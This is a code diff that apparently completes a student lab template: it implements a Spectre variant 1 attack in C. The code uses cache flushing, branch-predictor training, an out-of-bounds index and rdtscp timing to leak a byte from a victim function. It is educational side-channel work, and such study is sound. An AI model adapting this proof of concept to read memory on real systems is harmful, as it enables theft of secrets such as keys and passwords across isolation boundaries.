@@ -32,14 +32,75 @@ void victim_function(size_t x) {
  */
 void attack(size_t malicious_x, uint8_t value[2], int score[2]) {
   // TODO: Write this function
+#define THRESHOLD 100 // Threshold for timing attack
 
+  int tries = 1000;
+  int results[256] = {0};
+  size_t x;
+  volatile uint8_t *addr;
 
+  while (tries--) {
+    // Flush array2 from cache
+    for (int i = 0; i < 256; ++i) {
+      _mm_clflush(&array2[i * 512]);
+    }
+    // Ensure all previous operations are complete
+    for (volatile int j = 0; j < 1000; ++j);
+    _mm_mfence();
+
+    // Train the branch predictor
+    int training_x = tries % array1_size;
+    for (int i = 0; i < 30; ++i) {
+      // _mm_clflush(&array2[array1[training_x] * 512]);
+      // _mm_clflush(&array1[training_x]);
+      _mm_clflush(&array1_size);
+      // Delay to ensure clflush is effective
+      for (volatile int z = 0; z < 100; z++) {}
+      // _mm_mfence();
+
+      // Choose x: training_x for most iterations, malicious_x once
+      x = ((i % 6) - 1) & ~0xFFFF;
+      x = (x | (x >> 16)); // x = 0xffffffff if i%6==0, else 0
+      x = training_x ^ (x & (malicious_x ^ training_x));
+
+      // Call victim with x (sometimes valid, sometimes malicious)
+      victim_function(x);
+    }
+
+    // Measure timing for array2 access
+    volatile unsigned int junk = 0;
+    for (int i = 0; i < 256; i++) {
+      // Pseudo-random to prevent stride prediction
+      int rand_i = ((i * 167) + 13) & 0xFF;
+
+      uint64_t t0 = __rdtscp((uint32_t *)&junk);
+      junk = array2[rand_i * 512];
+      uint64_t delta_t = __rdtscp((uint32_t *)&junk) - t0;
+
+      if (delta_t < THRESHOLD && rand_i != tries % array1_size) {
+        results[rand_i]++;
+      }
+    }
+  }
+
+  int max = 0, second_max = 0;
+  for (int i = 0; i < 256; i++) {
+    if (results[i] > results[max]) {
+      second_max = max;
+      max = i;
+    } else if (results[i] > results[second_max]) {
+      second_max = i;
+    }
+    // printing the distribution of the hit count
+    // printf("%4d: %4d\t", i, results[i]);
+    // if (i % 8 == 7) printf("\n");
+  }
 
   // TODO: Report the real result
-  value[0] = '?';
-  value[1] = '!';
-  score[0] = 100;   // larger than or equal to score[1] by definition
-  score[1] = 30;
+  value[0] = max;
+  value[1] = second_max;
+  score[0] = results[max];   // larger than or equal to score[1] by definition
+  score[1] = results[second_max];
 }
 
 int main(int argc, const char **argv) {
